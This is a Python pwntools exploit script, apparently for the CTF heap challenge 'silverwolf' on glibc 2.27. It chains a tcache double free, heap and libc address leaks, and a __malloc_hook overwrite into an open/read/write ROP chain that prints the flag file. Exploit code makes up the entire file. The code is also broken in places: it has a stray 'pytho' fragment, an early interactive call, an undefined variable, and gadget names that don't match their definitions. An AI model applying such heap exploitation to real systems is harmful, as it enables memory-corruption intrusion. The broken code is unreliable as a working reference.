#encoding:utf-8
from pwn import *

#p=remote('123.60.218.64','23804')
p=process('./silverwolf')
libc=ELF('./libc-2.27.so')
context.log_level = 'debug'
context.binary = './silverwolf'

def allocate(size):
	p.sendlineafter(': ','1')
	p.sendlineafter(': ','0')
	p.sendlineafter(': ',str(size))

def edit(idx,text):
	p.sendlineafter(': ','2')
	p.sendlineafter(': ',str(idx))
	p.sendlineafter(': ',text)

def show(idx):
	p.sendline('3')
	p.sendline(str(idx))

def delete(idx):
	p.sendlineafter(': ','4')
	p.sendlineafter(': ',str(idx))

allocate(0x10)#0
edit(0,p64(0)+p64(0x511))

allocate(0x78)#1
allocate(0x78)#2
allocate(0x78)#3
allocate(0x78)#4
allocate(0x78)#5
allocate(0x78)#6
allocate(0x78)#7
allocate(0x78)#8
allocate(0x78)#9
allocate(0x78)#10
allocate(0x70)#11
delete(0)
edit(0,p64(0)*2)
delete(0)pytho
#gdb.attach(p)
p.interactive()

show(0)
p.recvuntil('Content: ')
#gdb.attach(p)


heap_base = u64(p.recvline()[:-1]+'\x00\x00') - 0x780
log.success('heap_base ==>'+hex(heap_base))

edit(0,p64(ptr0+0x270))
allocate(0x70)
allocate(0x70)
edit(0,p64(0)+p64(0x501))

delete(0)
show(0)
p.recvuntil('Content: ')
main_arena = u64(p.recvline()[:-1]+'\x00\x00') -0x60
log.success('main_arena==>'+hex(main_arena))
#gdb.attach(p)
libc_base = main_arena - 0x3ebc40
log.success('libc_base==>'+hex(libc_base))
malloc_hook = libc_base + libc.sym['__malloc_hook']
log.success('malloc_hook==>'+hex(malloc_hook))

openad = libc.sym['open'] + libc_base
readad = libc.sym['read'] + libc_base
writead = libc.sym['write'] + libc_base

pop_rdi = 0x00215bf + libc_base
pop_rsi = 0x0023eea + libc_base
pop_rdx = 0x0001b96 + libc_base
pop_rax = 0x0043ae8 + libc_base
syscall_ret = 0x000d2745 + libc_base
ret = 0x008aa + libc_base

payload_addr = heap_base + 0x270
str_flag_addr = heap_base + 0x270 + 5 * 0x8 + 0xB8
rw_addr = heap_base 

payload = p64(libc_base + 0x55E35) # rax
payload += p64(payload_addr - 0xA0 + 0x10) # rdx
payload += p64(payload_addr + 0x28)
payload += p64(ret)
payload += ''.ljust(0x8,'\x00')

rop_chain = ''
rop_chain += p64(pop_rdi_ret) + p64(str_flag_addr) # name = "./flag"
rop_chain += p64(pop_rsi_ret) + p64(0)
rop_chain += p64(pop_rdx_ret) + p64(0)
rop_chain += p64(pop_rax_ret) + p64(2) + p64(syscall_ret) # sys_open
rop_chain += p64(pop_rdi_ret) + p64(3) # fd = 3
rop_chain += p64(pop_rsi_ret) + p64(rw_addr) # buf
rop_chain += p64(pop_rdx_ret) + p64(0x100) # len
rop_chain += p64(libc_base + libc.symbols["read"])
rop_chain += p64(pop_rdi_ret) + p64(1) # fd = 1
rop_chain += p64(pop_rsi_ret) + p64(rw_addr) # buf
rop_chain += p64(pop_rdx_ret) + p64(0x100) # len
rop_chain += p64(libc_base + libc.symbols["write"])

payload += rop_chain
payload += './flag\x00'

allocate(0x20)
delete(0)
edit(0,p64(malloc_hook))
allocate(0x20)
allocate(0x20)
edit(0,p64(payload))
allocate(0x10)

#gdb.attach(p)
p.interactive()

